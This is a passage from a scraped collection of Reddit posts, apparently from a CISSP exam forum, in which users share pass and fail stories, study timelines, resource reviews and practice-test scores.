Next I went through a period of practice exam, official study guide, rinse, repeat. The first practice exam I took was the OSG's companion exam, then my three worst chapters in the OSG, then BOSON A, then the half-dozen worst chapters in the OSG (which did see some overlap), then BOSON B, the worst 3 chapters *and* the OSG's domain exams over the three worse domains, then BOSON C. I made notes along the way and reviewed the notes. I did all BOSON exams in ""study mode"" and if I missed the question I would screenshot the relevant parts of the explanation and added it to my study material. For the OSG practice exams, I would review the missed questions and also produce notes from them. All of my notes I went over at least twice, sometimes as many as six times. This being said by the time I had finished this, half of the OSG hadn't been touched, and I did not exhaust either the OSG practice exams (or close to it) or the BOSON exams. However the exams were different, so I would recommend both.

As a small aside, all of my study material was for the previous version of the CISSP. I did not feel like this left me ill prepared for the new version to any extent whatsoever.

Another small aside, I did watch a hodgepodge of videos on YouTube to focus in on any topic I felt uncomfortable with. My total time watching such videos was <6 hours, including repeating videos.

I also watched ""[Why you WILL pass the CISSP](https://youtu.be/-99b1YUFx0A)"" and read through [How To Think Like a Manager](https://www.amazon.com/Think-Like-Manager-CISSP-Exam/dp/1735085197/ref=sr_1_3?dchild=1&keywords=Think+like+a+manager&qid=1626967662&sr=8-3) during the weekend before my exam. I think they were both important, and added value. *However* I feel like the mindsets pushed in these study materials--*while valuable in the real world*\--weren't as important to the CISSP as they made it out to be. Still, do yourself a service and go through both of them.

Near the end of my preparations, I noticed I would read a practice question, and be able to *sometimes* articulate why two different answers were correct. Not in a ""these are both good answers, but I need to pick the best of the two,"" sort of way, but as a critique of the question author sort of way; I could display a deeper understanding that showed I understood the question; I was able to articulate an important security or business consideration that made it easy to justify multiple answers without more information. Thankfully on the actual exam I only came across one quesiton where I felt like I needed more information.

This level of understanding was probably the best sign I had that I was ready for the CISSP.

I was willing to accept if I picked a wrong answer in BOSON, the OSG exams, or Think Like a Manager, but about 1/3 - 1/5 of the time when I got a wrong answer I felt like I had a valid critique of the question, I would count myself as having gotten that question right. To that end, I was scoring about 85% on my last BOSON exam (first time taking the exam, I never repeated BOSON exams) and \~75% on my OSG ""trouble domains"" (domains where I was needing the most studying).

Lastly I will say please avoid the ""Inside Cloud and Security"" CISSP exam cram. I really hate saying this since his videos are engaging, clear, and generally well explained, however they suffer in three key ways. First what he decides to talk about feels like a patchwork of topics within the domain--or at least that's my view after having studied the domains--rather than a complete picture. Second, he often skips pass topics with a quick definition that really aren't valuable to you during the exam without actually understanding the topic, so it might give a false sense of readiness. Third, and most importantly, some things he says are outright wrong, which is dangerous for the exam. It felt like he got things that were more academic and less practical wrong, which makes sense given that he admits he did very little studying and depended on his extensive industry experience. 

# Final Thoughts/Summary

So the biggest reason I typed all of this up is to provide some context as to how to slam dunk the exam, and when you probably will slam dunk the exam. It also seems people are very hesitant in saying what % of practice exams will see that you pass, so here's my guide:

You're certainly ready to take the exam:

* When you're getting 80%+ on BOSON *from understanding the questions and not rote memorization.*
* When you're getting 75%+ on the OSG comprehensive exams *from understanding the questions and not rote memorization.*
* When you're getting 70%+ on the OSG domain-specific exams for your weakest trouble areas *from understanding the questions and not rote memorization.*
* After you go through the provided ""Think Like a Manager"" materials
* You have gone through all of the questions you missed, understand why you missed them, and spent time understanding accompanying material (if you miss a question about why a certain encryption technology is a bad choice in a specific situation, and another is a good choice, study both technologies in a broader sense, and loop in a third, forth, etc, technology that might be comparable)

This was where I was at, and, again, I was more than ready for the exam. Actually during the exam do basic good test taking skills such as ""carefully read the question, make sure you understand it, eliminate two answers,"" etc.

Also I will say the OSG exam *and* BOSON had questions that were grossly in the weeds such as ""you need to network two devices over X distance and you need Y speed. What Ethernet cable would you need?"" or ""A user is currently using 802.11(whatever). They want to upgrade to X speed. What 802.11 technology would your recommend?"" 

Do NOT worry about memorizing any tables of raw numbers like these. I saw NOTHING on the exam that was that in-the-weeds. Plenty of technical or semi-technical questions, but no rote memorization of numbers. In real life this is something you can certainly look up, or you deal with so regularly that you'll learn it as a matter of course.

I'd be happy to answer any questions that I can that respect the CISSP NDA.",2021-07-22
1660,opmbh7,"Provisionally Passed 100 Questions, 2 Hours","It seems customary to post a pass here, and since others' success stories have inspired mine, thought I would give my 2 cents as well.

I would consider myself one of the less experienced coming into the exam, am currently a post-graduate student finishing up Masters in 4 months, and zero work experience outside of an internship. 

Started 4 weeks ago using the following:

**Study Materials**

* [Sunflower CISSP Summary](https://docs.wixstatic.com/ugd/dc6afa_fc8dba86e57a4f3cb9aaf66aff6f9d22.pdf) by Maarten de Frankrijker
* CISSP Exam Cram by [Inside Cloud and Security](https://www.youtube.com/channel/UCAr0yk0um7lwLjmrKfzwyig)
* [Destination Certification](https://www.youtube.com/channel/UCXk6whiDrWq42y9Tdv1MEhg) summary videos
* Google

CISSP Exam Cram came first, and after finishing all 8 domains and doing a few questions, I watched Destination Certification videos as a refresher. Sunflower CISSP Summary was mostly used as reference material, alongside Google.

**Practice**

* CISSPrep

Comparing the style, CISSPrep questions were very similar to the questions I got during the certification tests. Its pretty affordable as well. Some questions there are worded poorly, or have bugged options (especially for the drag and drop, somehow it doesn't record your selections properly), and some questions that I got wrong were not very well explained by them. However, it did a proper job in training me to focus on what's important when reading and answering questions (think like a manager).

I would say that results for practice tests don't really matter (unless you're getting below 40-50%), what's important is what you get from it. I was scoring 60-65% on the CISSPrep mock exams the day before the test.

**Pre-Test/Pre-Practice**

*  [CISSP Testing Tips Secrets All Students Should Know](https://www.youtube.com/watch?v=CanT50bzEV0) by Andrew Ramdayal
*  [Why you will pass the CISSP](https://www.youtube.com/watch?v=v2Y6Zog8h2A) by Kelly Handerhan

Having little work experience, these 2 videos were vital in getting me into the correct mindset when doing practice questions, and sitting for the test. Watch them once before doing practice tests, and as many times as you want before you sit for the test, I feel it really helps.

**The Test**

It wasn't as hard as I expected it to be. Questions were pretty clear in explaining scenarios, just make sure to read carefully and read all the options. Many times I changed my answer at the last minute after realizing I read the question/options wrong or too quickly.

It was a wild 4 weeks for me with many lows, and not many highs, and I wish whoever who is preparing for their upcoming test all the best. Make sure to get enough rest the day before, and eat well (but not too well) to last the entire duration of the test.",2021-07-22
1661,opked7,CISSP Experience,"This forum helped me quite a bit and hence thought to update my experience for the benefit of the community and offer credit to the immense learning resources on the web

About me: Over 10 years in IT / Risk / Cyber.  

**Prep:** About 3 months, initially about 1 hour / day followed by 3-5 hours of revision in the last 2 weeks.

The following resources help strengthen my concepts (A big thanks to all of them):

· Thor Teaches

· Kelly videos

· Official study guide and practice questions

· CISSP mind maps on YouTube ([https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s](https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s))

· Reddit and ISC forum

· Reviewed the ISC practice questions once but did not attempt any more practice exams since I ran out of time. 

**Exam experience:**

Like most of the commentators before me mentioned, the questions were not straight forward, and I had no clue if the answer was correct. In fact, I tried looking up the answers to some of the questions I recalled at home but struggled even with Google! Some domains had more questions than others. I planned to take a break after 100 questions, but the exam ended on the 100th question with 1hour to spare. I did not look at my transcript until I was out of the centre  and was pleased to have provisionally passed. 

**Top Tips:**

Read the question and identity key words such as “Which solution”, “What comes first” etc. This should help filter out some of the answers. 

There is a lot of material out there and found additional value in each of them. Since the scope of CISSP is huge you will need to refer multiple sources.

If I had to prepare again, I would try to cover as many topics as possible and answer the following question with 1-line answers. What, Why and How. I don’t think it is necessary to go in depth and unnecessary details. Focus on concepts and understand why some of the technologies actually exist, their vulnerabilities and remediation. Use practice tests to re-in force these concepts and not as a barometer of your performance in the exam.

1663,ooy5bj,My CISSP journey from zero to passing with some obstacles," **My CISSP journey:**

I started studying at the beginning of 2019, inspired by some posts on reddit and the fact that the content of CISSP is very interesting for me and my further career steps. I spent about 3 months reading the Official Study Guide (OSG), researching a lot of content and taking lots of notes, and in the meantime, I was very confident that I would pass the exam.

However, in the middle of 2019, I stopped studying because I got an interesting job offer in security that required a bit more attention. So I decided to take a break and catch up on the OSG sections from time to time. 

In early 2020, I met a work colleague who has already passed the CISSP exam, he gave me some tips on good sources to continue with my studies. Later I will give a brief overview of the sources that helped me. I started studying seriously for a second time. This time with Thor and Kelly while I was driving. In the evenings I read the OSG and the latest Sunflower PDF to have a lot of information in a condensed form. Later in the year I ordered the Boson question bank and the OSG practice exam to practice some questions. In the beginning, I regularly scored 75% and reread my weak topics.

I booked my first exam in Germany, Düsseldorf for December 2020, due to Corona the test center was closed. The next possible date for the exam was in February 2021, this date was also cancelled. The next test date was then in April 2021. If I didn't pass the exam on that date or the test was cancelled again, then I would have to learn the new content because of the content update in 2021. And it happened again, the exam was cancelled again. Now it was clear I had to understand and be able to apply the new content, by 11 July. 

The last weeks before the exam I studied after work in the evenings for about 3+ hours, plus all the weekends. The day before the exam I thought I was ready to take it, but as soon as I saw the first 10 questions, I thought what the hell, I never read about this content. Halfway through, I wasn't very confident that I could pass the exam, but I focused on each question. When I finished the last question, I went to the reception and got my result - **Congratulations!** 

I passed, the CISSP exam.

**The study resources I used to prepare:**

**Cybrary Kelly Henderson:** I like her video training, she is very funny, knowledgeable and a great educator. You get a good and deep overview in her videos, which is easy to understand even as a non-native speaker. A must watch is her video on YouTube ""Why you will pass the CISSP"". 

**Thor Theache's CISSP:** I have seen a few write-ups saying that his content is not very good. But I disagree, his content is a bit expensive but worth watching. He is also a good trainer and sometimes he is available in the discord channel of certification station.

**CISSP for dummies:** I ordered this book and never read a complete chapter. Sometimes I had to re-read some content to get a second or third view of the content. 

**(ISC)2 Official Study Guide - latest version in 2020:** my main study resource, I read this book cover to cover, word for word. It is a good resource to get a good overview of the content, which is really a mile wide and a inch deep. At times I thought it was 1.61 km wide and 2.54 cm deep 😉. But if you ask me if you can pass with just the OSG, I will say, yes, it is possible, but you should take some time to read some other books as well.

**Eleventh Hour CISSP:** I got this book to get a quick overview of all the content that might be necessary in the last week. In hindsight, I would have read this first before going through the official study guide. It gives a good overview of everything to expect in the exam.

**(ISC)2 Official Practice Exam:** You should use the online version of the book, this is more helpful than the paperback. You will need to use the code you get from the paperback to register for the online test bank.

**Boson CISSP Practice Exam:** A lot of questions for a good price, updated regularly. You will need Windows to work with Boson. The questions are very technical and the answers are very well explained so you understand why the questions are wrong. This is a ready important aspect from my point of view.

**Certification Station Discord:** The CISSP channel is absolutely worthwhile. A very good resource that I would recommend anyone to join. Ultimate bunch of helpful people, open 24/7 (because of the international audience). Discussions on various topics have helped me a lot

**Destination Certification Flash Cards:** If you are on a train ride, journey or similar, take these flash cards and just read them one by one. Very helpful in my eyes. I would read them in the middle of my exam preparation.

**Do's and Don'ts:**

\- Register as soon as possible. The examination center in Germany, Düsseldorf is always fully booked at short notice.

\- I have done 4000+ questions.

\- Read correct AND incorrect answers of the question

\- Read the question twice during the exam

\- Do not give up during the exam, even if it looks bad

\- Be a member of a study group (Certification Station)

\- Eat well and do some exercises to have a fresh mind.

My last words, ""Don't talk the talk, walk the walk"" and all the best. I will now rest for a few weeks and then continue with CISA or CISM.",2021-07-21
1664,oox09n,Provisionally pased CISSP 150 w/ minutes left,"I failed november 2019 I was devestated, but when I jumped into the exam I got blindsided and it felt like I got run over by a truck.

2021Going into the exam I was much more well prepared, but I knew I had weaknesses. I felt like I could pass anyways.

April-May

Took CISSP SANS Course with David Miller. Loved the course, but wasn't crazy about Miller. There were something he said, that he was so confident in, that I found that were either wrong, or poorly said. He also talked really fast without a quick break. I imagine this might be because of online teaching, but maybe go with one of the course creators. For example, we got hung up on the terminology On-premise, on-prem or on-premises and what the exam would use.

Not to drive into it, but that isn't important, lets discuss the topics, not that on-premise is not correct terminology when talking to IT personel, and at the end of the day, no one cares. However, David Miller was really good diving into the technical points and bringing it all together. If you don't mind some of the small banter, and fast speaking, then go this route.

I would recommend the course, but be weary, everyone is different, and I really believe teachers should be suited to the student.

&#x200B;

SANS then provided Audio w/ Eric Conrad. I used this whenever I could.  A lot of story telling, but when it would drive into the points it was good.

I used Eric Conrads books, which were great. Really helped me drive some points.

Coffee shot videos 9/10, they really put things together for me, on how to answer and review CISSP questions

Luke Ahmeds book 10/10 was the BIGGEST help after the full study.

**Practice Tests:**  


**Cisspprep** 100% need this, you'll get mad at yourself but do it. Thank me later  
**Sybex Wiley** Do this about 6-4 weeks prior to your test. Then a few weeks before do ALL the questions you got wrong, study those topics that you keep getting wrong  
**PocketPrep** 7/10 Its good for on the go and helps reinforce concepts that you know but KISS

1665,oonpos,Passed yesterday with 100 questions,"So glade to have this done. Been in IT for a while and never got any certs. In the year, I got A+, Net+, Sec+ and now CISSP, which is way harder than any of the others. I took this exam back in May and failed the first time. So, after this I change my study method, which was just go through the Official guide a few times. 

Although I don't like bootcamps, I did attend one by Technical Institute of America, with Andrew Ramdayal. He is a very good instructor and I used his udemy to pass the sec+ a few months ago. His course really helped me understand the mindset of the question and topics. I then got the new official guide that came out last month made tons of notes. I only used CCCure questions and the the ones from the study guide. 

I think what made the difference is the way you approach the questions. Coming from sec+, you are more direct and this exam is not. Sec+ was always 1 correct choice, this exam some of them had what I taught is 4 correct choice. Andrew Ramdayal, larry greenblatt, and Kelly has the tips you need to pass the exam on youtube. Check them out. Trust me when I say this exam is more of how to select the correct answer than it is about knowing your stuff.  

You guys can can pass easily if you apply the right mindset. DO NOT go into the testing room without the right mindset or you will fail. This exam is very different than any of the 3 comptia certs I did. Thanks to everyone in this sub to help point me in the right direction after failing and losing $700.",2021-07-21

1670,oo5siy,Today was the day......,"Today was the day that I skipped like a schoolgirl, air punching, and yelling around a parking lot for 10 minutes…. Yes, it happened. Okay, what you’re here for.

After a little over 2 hours (I think), I have concurred this thing… I have roughly 9 years of experience in the field, with various certifications (CASP+, SEC+, A+, and CCNA). I am also pursing an MS-Info Science – Info Assurance.

Length of preparation for me was two months and some change… I chose to utilize my summer break from Grad school to prepare for this exam… and it worked out! Not itemizing hours, or questions, or pages, or any ""quantifiable things"" as everyone is different, and everyone takes in information at different speeds.... but here's what I have for you!

My piece(s) of advice:

1. Why do you want this thing? It’s not a “fun” process…. If you do not have a solid reason to dedicate yourself for however long you identify you need to prepare… it might not happen… I’ve creeped this thread, messaged many, and it’s happened, yes…however the odds are not likely. Know why you want to be a CISSP, and let that drive you to studying and preparing to test!
2. Mentally prepare yourself to sit there for 150 questions, when my test went past 100… I immediately got down on myself based off peoples comments of the 100q pass…. This took me a minute to take a deep breath, and get back into it… so just prepare yourself mentally you’re in it for the long haul! After all, a pass is a pass…..
3. Full dedication to the process. As mentioned I chose to use my summer break for this certification. My commute to work was not filled with music, it was filled with downloaded videos (mentioned below), via YouTube premium (FREE for one month, do this!) every single day for the duration of my preparation. My evenings were not filled with having beers with buddies, or watching movies with the wife and dogs…. It was spent in our office, reading, watching, listening, writing….. This thing is its own beast, and requires your mental and physical dedication…. Know that before you start this process!
4. Relax, breath, think…. That’s what my scratch pad said…. When I hit a question that went from an easier type question, to a short story…. I had to remind myself to relax, breath…. Which allows you to think.
5. Do not be afraid to fail. This is one thing I told myself starting this process, no matter what happens, I am bettering myself for doing this… I was not afraid to fail, what I was afraid of was of having to continue to study and retake this thing….wasting what I have left of my summer break… so don’t be afraid! After all, it’s a process, and participating in this process you will be shocked at how much you learn and grow!

Resources (what people seem to care about the most):

* Sybex OSG (8th Ed.):

\-Primary resource of reference/clarification for the entire process.

\-First pass, “read” cover to cover… took end of chapter tests, moved onto next chapter.

\-Emphasizing the “read” portion, as I did not read it word for word as some did….. Chapters I felt more comfortable with the material, I skim read and picked points within each chapter I had no idea what is was, and fully read that section.

\-Second pass, read the sections I scored lower than 75% on the end of chapter tests from start to finish, retook the tests.

* Sybex OSG Practice Tests (8th Ed.): Register your book online! Much easier and more convenient as you can access the tests with your phone, or tablet…. I DID NOT take all of these tests, as mentioned I did each chapter test in the manner above. For each practice test, the matter at which I took them, took each Domain test once, pending the score (e.g. below 75-80%) I would go back and review that domain, and then retake the questions I got wrong… to alleviate from memorizing answers.
* 11th Hour CISSP: After I read the massive Sybex OSG I needed more “light reading.” I read this book front to back, easy read…. Very high level overview of the topics. So stepping your mindset back a bit from the OSG source.

Videos:

* CybraryIT -  [Free Cybersecurity Training and Career Development | Cybrary](https://www.cybrary.it/) (free access if you only access a certain number of sources, not do check whatever I did about a ""premium offer""..they'll never stop calling you until you tell them to leave you the heck alone) – Kelly H’s videos… these were a great change of pacing getting out of a book, and questions. I DID NOT watch all of these….I watched her videos on topics I needed clarified, or explained in another way from my reading.
* Destination Certification Mindmaps -  [CISSP MindMaps / Domain Review - YouTube](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) : Wow, yes, I watched all of these…. And some of them multiple times for topics I just wasn’t grabbing onto….. 10/10 recommend this to help tie words together that may help you on the exam.
* Inside Cloud and Security -  [CISSP Exam Cram - YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) : Again, yes, I watched all of these…… And some of them multiple times (probably each of them at least twice). I used his 2021 topics videos to supplement the OSG version I used not having the most recent topics.
* Prabh Nair’s CISSP videos, and Coffee Shots -  [Prabh Nair - YouTube](https://www.youtube.com/channel/UCfZMpaSGpTa4JoqoZHCJBcw) : I incorporated these my final two weeks of study (by the point you’re either getting it or you’re not)… his videos were great! I also used his 2021 topics videos to supplement the OSG version I used not having the most recent topics. Tip for his videos, put the speed on .75x… he speaks rather quickly…. This helped my tremendously.
* Andrew Ramdayal CISSP videos -  [CISSP - YouTube](https://www.youtube.com/playlist?list=PLdC3YQR4lNFLHJh_lOd2QMovHjhEdTFjN) : I watched all of his videos once, particular one that stood out to me was his “Testing Tips” and “Practice Question” videos.

Questions:

* OSG Practice tests
* CISSprep.net: I was hesitant on buying this… just because I am cheap, and the mixed opinions… I personally enjoyed this platform, the questions were a headache, yes…grammar mistakes, some complained about not knowing single or multiple answer options…whatever, if you’re worried about that… you’re head is not in the right place. Pass the exam, make your own prep engine that is grammatically correct with explicit instructions of SELECT ONE....….(end rant on CISSprep). Scores ranging from 50-80%.... my overall average score was 65.8%.. I tracked my scores throughout the process... OCD, sometimes, more of a moral booster....
* Pocketprep App: This was an awesome resource for me because of convenience. Can be taken on your phone or table! Definitely helps nail down the factual items to build the conceptual knowledge you need.
* ISC2 Official Study App: Again, great resource due to convenience! Great supplemental method of doing questions to keep your mind on topics along with Pocketprep.
* rSlades blog post on ISC2: [Practice Questions - (ISC)² Community (isc2.org)](https://community.isc2.org/t5/Exams/Practice-Questions/td-p/18626?fbclid=IwAR138lfLPSzBL90njFDCi6Xe0j-wUXT7i1I4nw8iS3rs33HyV-P_tMlzU_0). These were awesome, another source of questions with explanations (sometimes collaboration from viewers)

Notecards:

*   I made note cards for basic topics, processes, procedures, and concepts I knew I needed to have in an instance… maybe 50-75 notecards total, I did them every day before work, and every night before bed….things such as: SDLC, BCP, DRP, BIA, SOC reports, Security Models, Incident Response, RMF, RAID, Backup Types/Benefits, SAML, ISC2 Cannons, Cryptography. More or less things I knew I needed to nail down, processes/steps, and random things I just always have a hard time committing to memory. 

Anyways, yeah…. I am humbled, overwhelmed, and gracious to join the ranks of fellow CISSPs! Thanks to all for continuously keeping this thread alive (daily), I lied in wait for a while taking notes on peoples prep methods, inputs, etc. and here I am! Thanks to all those on here I reached out to with questions/advice! Now I am going to enjoy the month I have left before back to the educational grind in the evenings!

1673,onz36q,Passed (1 hour ago :D) 1st Try 100 Questions,"In the words of Colin Weaver ""Hey all you CISSP wanabees""

I just got back from my exam and all my thoughts are fresh in my mind so I thought I could share them with this group.

**My Background**

I've been in Cyber Security for just over 5 years. I work for a fortune 500. I'm a manager for a team that works on data security: DLP, DRM, Insider Threat.

**How I studied**

I started studying in late September or early October of last year. I went through the official study guide. I read through the entire book and took notes as I went. I used the online test bank that comes with the book and was going through. I was studying maybe 1 hour a day and usually 2-3h/day on weekends. Around Christmas I got burned out and then picked it back up around the end of January.

Then I went through the Destination Certification videos. I was getting about 80% on my Sybex practice exams and I felt good. Sybex also has online flashcards which helped too. At this point I was studying a minimum 2 hours per day. I went to book my exam and saw that the testing facility had filled up and I couldn't take my exam for another 2 months. (This pushed me into May and the updated course.)

With my extra time to study and to prepare for the updated course I watch Mike Chapple's Stuff on LinkedIn Learning. I'm not sure I would recommend the course, I can't remember a single topic I retained from his class. He did cover some topics for the new exam but he presented in a really dry way. I was watching at 1.25 speed the entire time. I also downloaded Anki, a flashcard program which was one of my best tools. Someone has uploaded some free practice questions that you can search for. I also just started adding terms and topics I needed to study harder. When I would go through an exam and get something wrong I would add that as a card. I have reviewed flashcards everyday since May.

With one last weekend before my exam, I bought some extra practice exams to study. I bought CISSP Exam Prep and the Udamy course. I took the Udamy exam and got a 40% three days before my exam date. Let's just say I was a bit concerned. I started taking the CISSP Exam Prep exams and I was getting 50%-60%. I freaked out and after some discussions with my fiancé decided to pay the $50 and reschedule for July.

I wanted to study seriously for the next two months with my extra time. I started by going through Kelly Handerhan's course. Her course was really good for what it covered but it doesn't cover all topics. Then I started going through the CISSP Exam Prep practice exams every other day. Then on the other day I would review other materials. I reviewed the Sybex book again. I read the 11th hour book (I wouldn't recommend it). I did IT Dojo Questions of the day, these were good when I was burned out from doing other things. I also studied my flashcard every day. At this point I was probably studying 2.5 hours everyday. I would also do Boson exams to get ready and identify gaps in my knowledge.

Yesterday, I reviewed my flashcards and then meditated a lot to calm my nerves. I watched Kelly Handerhan's why you will pass the CISSP exam. I had 3-4 questions where this video directly helped me.

**The Exam**

I expected the exam to be less technical than Boson and CISSP Exam Prep. It was. It was more straightforward knowledge based than I expected. I was expecting more experience questions but most of the questions were around a specific piece of information from the CBK. I kept hearing ‘think like a manager’, but I felt like there were more knowledge based questions. They weren't trying to trick you as much as I was expecting. I felt like I was very prepared with what I had learned and studied. Once I got into the exam it wasn't as bad as I was expecting. I felt okay about a lot of questions. In the last 10 questions, the questions got easier and I ended right at 100.

**What I recommend**

Reading the Sybex book was painful but had to be done. I think after that I would have done a visual refresher like Destination Certification. Using Boson and CISSP Exams, but using them to learn, not killing yourself on the score you get. You can't get a 40% and expect to pass but don't worry if you are getting a 66% vs a 70%. These exams are way more technical and complexly worded than the real exam. They help you prepare for the mindset of being able to pick apart a question. For example, if you see a question about control implementation, you better make sure you know if they want a preventive control, a detective control, an administrative control, or a technical control. That’s the mindset you need to have. Flashcards are a must for cementing topics in your head. I highly recommend Anki. I didn’t do a bootcamp but looking back I should have asked my company to buy me one. 

I don’t recommend the Udamy exam. It was overly confusing and just intentionally difficult. Some of the questions I was just mad at and would roll my eyes at why they said the answer I chose was wrong. 

Booking the exam well in advance is important. I didn’t realize that it would fill up. I checked once and they had openings every wednesday. Then I went to schedule my exam, and it was full for the next two months.

If I was doing it again, I think I could have shortened my study time, if I had done the practice exams earlier. I had relied a lot on the Sybex exams and thought those would be enough but they weren’t for me, they gave me a false sense of security. 

**Content Refresh**

I know a lot of people want to know how different the content is for the new exam. I do think I got a couple questions on new content but it was topics that I was familiar with through my work so it wasn’t very difficult.

**Overall**

Keep studying, keep working, keep your faith. Good luck everyone!",2021-07-20

1675,onxvll,Provisionnally passed @100 questions,"Hi,

Just wanted to share my feedback after passing provisionnally.

&#x200B;

**About me**

* About 10 years experience in IT Audit, GRC, CISO. Not really a tech guy.
* I registered 2 years ago, had zero motivation to study and rescheduled it. Then covid arrived and I had to reschedule two more times...

&#x200B;

**Preparation**

1. Eleventh Hour CISSP - I did not open at all the official guide, but I have read twice this smaller book. Very good starter for lazy people like me.
2. CISSP Official Practice Tests - Did all questions and looked on internet to understand when I was wrong. Resources I used the most.
3. PocketPrep (IT & Security) - Very good to test your knowledge with direct questions to use during transports. Not too technical and not too expensive. I did all questions.
4. Random website ([http://luc.desfosses.fr/CISSP/](http://luc.desfosses.fr/CISSP/)) - I do not remember where I found it, probably on reddit, but this has been a good summary of key concepts. I also wrote on paper the key concepts (OSI, ports, security models, SOC, BCP, ...).
5. 2021 Exam change - As I took a very long time to get the motivation to start studying, the content has changed in May so I looked to the changes on this website [https://www.cybervista.net/cissp-may-2021-exam-update/](https://www.cybervista.net/cissp-may-2021-exam-update/)

I hesitated a lot to buy Boson questions after reading this reddit, but I also looked at many feedbacks here saying that Boson questions were too technical compared to the exam so I did not buy. And to be honest I think that knowing more technical details would not have helped at all. At least I saved some money.

&#x200B;

**Exam**

* As most of people here I was not very confident that I would succeed during the test. I thought I would go to 150 questions but it ended at 100...
* You really need the high level view of what is used for what (concepts). You do not need to bother learning by heart every technical details of everything.
* Work experience helped a lot, although I am not a tech guy I review lots of risk analysis and the mindset is similar.

Good luck to everyone ! I will go for CCSP in September :)",2021-07-20

1677,ooeqh5,CISSP Is Overhyped,"Context: I'm 18 and a senior in a Cybersecurity Engineering program

Did 25 practice problems last night and went in with an hour of sleep into the exam (Couldn't put down the video games lol). Exam ended at 120/150 question and I passed.

I felt offended at how easy it was. In my opinion, it was much easier than even Security+. And we all know how much of a joke Sec+ is.

If someone can study for the CISSP while taking 16 credits over the summer and playing Genshin Impact for 6 hours a day then I'm sorry but the exam has lost its credibility.

I will try for OSCP after the summer semester ends and hopefully it doesn't end like CISSP.

1679,onsqur,Study Partner/Study Group?,"Hello everyone. I am currently studying for the CISSP exam with my test date set for September 17th. I have been in the Info Sec world for a little over 4 years as a security generalist for 2 medium-large companies (technical title is Security Engineer but it's more a combo of engineering/analyst work/compliance stuff - basically whatever needs to be done).

I have read in various posts that having a study partner or being in a study group is a helpful tool, but I'm not quite sure what that entails - regular group study sessions? IMing each other questions? Having someone to console you when you realize your brain is too small to retain any knowledge??

My current study plan is:

1. **July 8 - Jul 30:** Self-Study with Mike Chapple Linked-In Course. Review with Pocket Prep app. Take test quizzes/exams on CISSPrep after finishing course videos.
2. **Aug 2 - 6:** TIA CISSP Bootcamp
3. **Aug 9 - September 15:** Review Bootcamp notes, Create Flashcards, More CISSPrep, Read Official Study Guide Cover to Cover (the book comes with my bootcamp), Do Practice material in Official Study Guide
4. **September 16:** sacrifice goat
5. **September 17:** PROFIT?

**I don't know if this is enough.** If feel so unprepared even though i have only been watching the course and taking notes for a little over a week. For my previous 2 certs (Sec+ and GCED) I just took a bootcamp, studied a little, took a few practice tests and I was ready to go. Had no issues with either exam. But I am dreading this one. 

So I'm wondering if adding a study buddy/study group will help me feel less...stupid? Or at least help me to know if I'm way off base with my learning.

1682,on293l,"Passed and certified, here are my thoughts.","Hey everyone, as the title states I provisionally passed my CISSP exam at the end of June and was fully certified by (ISC)² three weeks later. I delayed making a post to formulate my thoughts regarding the entire experience.  This post is kind of long, TLDR at the bottom. 

Initially I reviewed this subreddit to get a grasp of where to begin, though I will admit I didn’t follow the suggested study plan.  I studied lightly on/off for 3 months and diligently for 2 months. Make sure in the lead up you take time for yourself. If you begin feeling burnt, stop for a while.  Play some games, go for a run, or talk with a friend about non CISSP stuff. Studying through fatigue will only hurt you. 

For background I have 5 years direct information security work experience and a graduate level degree. 

Books
- CISSP All-in-One Exam Guide, Eighth Edition, 8th Edition - Rating: 8/10
- Sybex (ISC)² CISSP Certified Information Systems Security Professional Official Study Guide, 8th Edition - Rating: 10/10

The AIO helped me get into the right mindset regarding the exam. The dialogue referenced many real world applications of the concepts. 
The Sybex book was by far the best study resource for exam preparation.  It covered everything necessary for exam prep. 
When I encountered a topic or concept in either book I was unsure about (even slightly) I transcribed the definition or section verbatim into a spiral using a pencil (tactile feedback)

Practice Exams
- (ISC)² CISSP Certified Information Systems Security Professional Official Practice Tests (online bank included with the book) - Rating: 9/10
- Boson - Rating: 2/10
- Pocket prep (free 30 questions)- Rating: 3/10

The official practice tests online were invaluable for isolating the areas I had deficiencies in. Additionally, the flash cards were great for quick studying throughout the day. 
The Boson test bank was large, though in my opinion the program was clunky and the questions were not as useful as reviews I had read made them out to be. I didn’t use the Boson tests in the final stretch of my study. It may work for you, though I suggest trying the official practice tests (included in the official guide package) before shelling out money to Boson. 
PocketPrep was great for quick study when I was waiting in lines or had a spare moment. I didn’t purchase the full version as I had already purchased the Boson bank. 
Overall, the practice tests were nice to prepare me for timing on the exam and identifying deficient areas, though they are not reflective of the exam itself. As difficult as it may be, don’t put too much stock in the practice exam scores, instead use the data to focus your study efforts. I really dug my heels into practice exams in the final few days before the exam and found myself doing worse and burning myself out.  Much like the books I hand transcribed the answers to questions I got wrong and flagged them. 

Audio/Video
- CISSP, 2nd Edition Sari Greene - Rating: 7/10
- Destination Certification (YouTube) - Rating: 4/10
- Eleventh Hour CISSP Study Guide (Audible) - Rating: 10/10

Sari Green is great. The videos were encouraging and the knowledge tests assisted in recalling useful information. I will admit I didn’t finish the series as it wasn’t as in depth as the official study guide. 
The Destination Certification YouTube series was nice for background study and reference, though for me it was more of a feel good effort. Some of the graphics assisted me in mentally categorizing information. 
Eleventh Hour was fantastic. I snagged it on Audible in the final two weeks of study, listened to it at 1.25 speed while working out or cleaning and would make notes on my phone of topics I wanted to review in depth. This resource often highlighted information that I gleaned over in the books.

Endorsement Process
Once I passed, I created my account and submitted my application. There are no CISSP’s that I work with so I opted to have (ISC)² sponsor me. 2.5 weeks after submitting my application (ISC)² stated they needed additional verification of my work history. Unfortunately my place of employment refused to write/provide a letter of affirmation regarding work history and directed me to a third-party service. I provided the information to (ISC)² and received feedback that they will not interact with a third-party. (ISC)² then stated they were going to audit my application. I won’t lie to you all, this stressed my out after having read some horror stories on this subreddit. 
Nearly out of options, I provided tax documents (with sensitive information redacted) and unofficial transcripts. The next day I got a notification that my application was accepted and I could pay my membership fee.  

Overall, it was a lot of study and felt daunting at times. Take it a topic at a time, write things down, and take breaks! Good luck everyone!

TLDR: The Official (ISC)² study materials are S-tier, don’t stress over practice exam scores, take breaks and separate when you get tired.",2021-07-19

1684,omj3yq,7/10/21 Fail at 150 questions,"Sigh. Here I am writing the post I never wanted to write. I went for it on 7/10/21 and didn’t pass. Hoping to help others and get a little advice on the next steps to take. 

